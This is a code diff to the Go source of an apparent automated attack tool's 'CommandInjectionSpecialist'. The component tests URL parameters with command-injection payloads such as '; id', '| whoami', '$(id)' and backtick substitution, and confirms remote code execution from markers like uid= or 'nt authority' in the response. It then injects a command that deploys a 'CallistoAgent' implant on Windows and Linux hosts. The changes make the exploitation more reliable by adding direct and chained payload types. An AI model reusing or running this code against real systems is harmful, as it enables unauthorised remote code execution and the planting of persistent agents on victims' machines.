@@ -114,7 +114,7 @@ func (c *CommandInjectionSpecialist) executeTask(cmdEvent bus.Event) {
 	}
 
 	log.Printf("[%s] 🔥 Verifying RCE on: %s (param: %s)\n", c.id, targetURL, parameter)
-	verified, payload, actualParam := c.verifyRCE(targetURL, parameter)
+	verified, payload, actualParam, payloadType := c.verifyRCE(targetURL, parameter)
 
 	if !verified {
 		log.Printf("[%s] ⚠️ RCE verification failed - aborting agent deployment\n", c.id)
@@ -122,12 +122,12 @@ func (c *CommandInjectionSpecialist) executeTask(cmdEvent bus.Event) {
 		return
 	}
 
-	log.Printf("[%s] ✅ RCE verified with payload: %s (param: %s)\n", c.id, payload, actualParam)
+	log.Printf("[%s] ✅ RCE verified with payload: %s (param: %s, type: %s)\n", c.id, payload, actualParam, payloadType)
 	evidence := fmt.Sprintf("Command execution confirmed with payload: %s (parameter: %s)", payload, actualParam)
 	c.reportVerifiedRCE(targetURL, payload, evidence)
 
 	log.Printf("[%s] Deploying CallistoAgent via Command Injection (both platforms)...\n", c.id)
-	results := c.deployAgentBothPlatforms(targetURL, actualParam)
+	results := c.deployAgentBothPlatforms(targetURL, actualParam, payloadType)
 
 	// Generate report
 	report := c.generateReportBothPlatforms(results)
@@ -142,25 +142,33 @@ type DeploymentResult struct {
 	Error    string
 }
 
+// PayloadType indicates how the command injection works
+type PayloadType string
+
+const (
+	PayloadTypeDirect   PayloadType = "direct"   // Direct command execution (e.g., command=id)
+	PayloadTypeChained  PayloadType = "chained"  // Chained with separator (e.g., host=localhost;id)
+)
+
 // deployAgentBothPlatforms deploys agent for both Windows and Linux via Command Injection
-func (c *CommandInjectionSpecialist) deployAgentBothPlatforms(targetURL string, parameter string) []DeploymentResult {
+func (c *CommandInjectionSpecialist) deployAgentBothPlatforms(targetURL string, parameter string, payloadType PayloadType) []DeploymentResult {
 	results := make([]DeploymentResult, 0, 2)
 
 	// Try Windows first
 	log.Printf("[%s] 🪟 Attempting Windows agent deployment via Command Injection...\n", c.id)
-	winResult := c.deployAgentViaRCE(targetURL, parameter, "windows")
+	winResult := c.deployAgentViaRCE(targetURL, parameter, "windows", payloadType)
 	results = append(results, winResult)
 
 	// Try Linux second
 	log.Printf("[%s] 🐧 Attempting Linux agent deployment via Command Injection...\n", c.id)
-	linuxResult := c.deployAgentViaRCE(targetURL, parameter, "linux")
+	linuxResult := c.deployAgentViaRCE(targetURL, parameter, "linux", payloadType)
 	results = append(results, linuxResult)
 
 	return results
 }
 
 // deployAgentViaRCE deploys CallistoAgent via Command Injection vulnerability
-func (c *CommandInjectionSpecialist) deployAgentViaRCE(targetURL string, parameter string, platform string) DeploymentResult {
+func (c *CommandInjectionSpecialist) deployAgentViaRCE(targetURL string, parameter string, platform string, payloadType PayloadType) DeploymentResult {
 	result := DeploymentResult{
 		Platform: platform,
 		Success:  false,
@@ -190,12 +198,20 @@ func (c *CommandInjectionSpecialist) deployAgentViaRCE(targetURL string, paramet
 
 	log.Printf("[%s] Deployment command: %s\n", c.id, deployCommand)
 
-	// Build Command Injection payload
+	// Build Command Injection payload based on payloadType
 	var payload string
-	if strings.ToLower(platform) == "windows" {
-		payload = fmt.Sprintf("& %s", deployCommand)
+	if payloadType == PayloadTypeDirect {
+		// Direct command execution - no prefix needed
+		payload = deployCommand
+		log.Printf("[%s] Using DIRECT payload (no prefix)\n", c.id)
 	} else {
-		payload = fmt.Sprintf("; %s", deployCommand)
+		// Chained payload - add separator prefix
+		if strings.ToLower(platform) == "windows" {
+			payload = fmt.Sprintf("& %s", deployCommand)
+		} else {
+			payload = fmt.Sprintf("; %s", deployCommand)
+		}
+		log.Printf("[%s] Using CHAINED payload (with separator)\n", c.id)
 	}
 
 	log.Printf("[%s] Executing deployment via Command Injection...\n", c.id)
@@ -388,13 +404,18 @@ func (c *CommandInjectionSpecialist) extractTaskInfo(taskDesc string) (targetURL
 }
 
 // verifyRCE attempts to verify command injection by executing test commands
-// Returns (success, payload, actualParam) if RCE is confirmed
-func (c *CommandInjectionSpecialist) verifyRCE(targetURL string, parameter string) (bool, string, string) {
+// Returns (success, payload, actualParam, payloadType) if RCE is confirmed
+func (c *CommandInjectionSpecialist) verifyRCE(targetURL string, parameter string) (bool, string, string, PayloadType) {
 	log.Printf("[%s] 🔥 Verifying RCE on: %s (param: %s)\n", c.id, targetURL, parameter)
 
 	// Common Command Injection parameter names to test
 	commonParams := []string{
 		"command", "cmd", "exec", "execute", "system", "host", "ip", "ping",
+	}
+
+	// Direct command parameters (no separator needed)
+	directParams := map[string]bool{
+		"command": true, "cmd": true, "exec": true, "execute": true, "system": true,
 	}
 
 	// If parameter is generic/unknown/multi-value, only test common params
@@ -422,26 +443,6 @@ func (c *CommandInjectionSpecialist) verifyRCE(targetURL string, parameter strin
 		log.Printf("[%s] Testing specific parameter '%s' first, then common names\n", c.id, parameter)
 	}
 
-	// Determine payloads based on platform
-	var payloads []string
-	if strings.ToLower(c.platform) == "windows" {
-		payloads = []string{
-			"& whoami",
-			"| whoami",
-			"&& whoami",
-			"; whoami",
-		}
-	} else {
-		// Linux payloads
-		payloads = []string{
-			"; whoami",
-			"| id",
-			"$(whoami)",
-			"`whoami`",
-			"&& id",
-		}
-	}
-
 	// Create executor (use TRT remote executor)
 	executor := trt.NewRemoteExecutor(c.trtClient, c.agentPaw, c.platform)
 
@@ -449,8 +450,35 @@ func (c *CommandInjectionSpecialist) verifyRCE(targetURL string, parameter strin
 	for _, param := range paramsToTest {
 		log.Printf("[%s] 🔍 Testing parameter: %s\n", c.id, param)
 
-		for _, payload := range payloads {
-			log.Printf("[%s] Testing payload: %s\n", c.id, payload)
+		// Determine if this is a direct command parameter
+		isDirect := directParams[strings.ToLower(param)]
+
+		// Build payloads based on parameter type
+		var payloads []string
+		var payloadTypes []PayloadType
+
+		if isDirect {
+			// Direct command parameters - test without separator first
+			if strings.ToLower(c.platform) == "windows" {
+				payloads = []string{"whoami", "& whoami", "| whoami"}
+				payloadTypes = []PayloadType{PayloadTypeDirect, PayloadTypeChained, PayloadTypeChained}
+			} else {
+				payloads = []string{"id", "whoami", "; id", "| id"}
+				payloadTypes = []PayloadType{PayloadTypeDirect, PayloadTypeDirect, PayloadTypeChained, PayloadTypeChained}
+			}
+		} else {
+			// Chained parameters (e.g., host for ping injection)
+			if strings.ToLower(c.platform) == "windows" {
+				payloads = []string{"& whoami", "| whoami", "&& whoami", "; whoami"}
+				payloadTypes = []PayloadType{PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained}
+			} else {
+				payloads = []string{"; id", "| id", "&& id", "$(id)", "`id`"}
+				payloadTypes = []PayloadType{PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained}
+			}
+		}
+
+		for i, payload := range payloads {
+			log.Printf("[%s] Testing payload: %s (type: %s)\n", c.id, payload, payloadTypes[i])
 
 			// Build test URL
 			testURL, err := url.Parse(targetURL)
@@ -470,23 +498,56 @@ func (c *CommandInjectionSpecialist) verifyRCE(targetURL string, parameter strin
 				continue
 			}
 
-			// Check for command execution indicators
-			lowerResponse := strings.ToLower(response)
-			if strings.Contains(lowerResponse, "root") ||
-				strings.Contains(lowerResponse, "www-data") ||
-				strings.Contains(lowerResponse, "uid=") ||
-				strings.Contains(lowerResponse, "gid=") ||
-				strings.Contains(response, "nt authority") ||
-				strings.Contains(response, "\\") { // Windows path indicator
+			// Extract HTTP body from response (skip headers from curl -i)
+			httpBody := extractHTTPBody(response)
+			lowerBody := strings.ToLower(httpBody)
 
-				log.Printf("[%s] ✅ RCE verified! Response contains: %s\n", c.id, response[:min(100, len(response))])
-				log.Printf("[%s] ✅ Working parameter: %s\n", c.id, param)
-				return true, payload, param
+			// Check for command execution indicators in HTTP body only
+			// Avoid false positives from Windows Agent's curl output (e.g., "E:\business\...")
+			isRCESuccess := false
+
+			// Linux indicators
+			if strings.Contains(lowerBody, "uid=") && strings.Contains(lowerBody, "gid=") {
+				isRCESuccess = true
+				log.Printf("[%s] RCE indicator: uid=/gid= found\n", c.id)
+			} else if strings.Contains(lowerBody, "root") && !strings.Contains(lowerBody, "error") {
+				// "root" but not in error messages
+				isRCESuccess = true
+				log.Printf("[%s] RCE indicator: 'root' found\n", c.id)
+			} else if strings.Contains(lowerBody, "www-data") {
+				isRCESuccess = true
+				log.Printf("[%s] RCE indicator: 'www-data' found\n", c.id)
+			}
+
+			// Windows indicators - must be in HTML output section, not curl headers
+			if strings.Contains(lowerBody, "nt authority") {
+				isRCESuccess = true
+				log.Printf("[%s] RCE indicator: 'nt authority' found\n", c.id)
+			}
+
+			if isRCESuccess {
+				log.Printf("[%s] ✅ RCE verified! Response body: %s\n", c.id, httpBody[:min(200, len(httpBody))])
+				log.Printf("[%s] ✅ Working parameter: %s (type: %s)\n", c.id, param, payloadTypes[i])
+				return true, payload, param, payloadTypes[i]
 			}
 		}
 	}
 
-	return false, "", ""
+	return false, "", "", PayloadTypeChained
+}
+
+// extractHTTPBody extracts the body from HTTP response (skips headers)
+// This is needed because TRT Remote Executor returns full curl -i output
+func extractHTTPBody(response string) string {
+	// Look for double newline (end of headers)
+	if idx := strings.Index(response, "\r\n\r\n"); idx != -1 {
+		return response[idx+4:]
+	}
+	if idx := strings.Index(response, "\n\n"); idx != -1 {
+		return response[idx+2:]
+	}
+	// If no headers found, return as-is
+	return response
 }
 
 // reportVerifiedRCE publishes a Finding event to Reporter
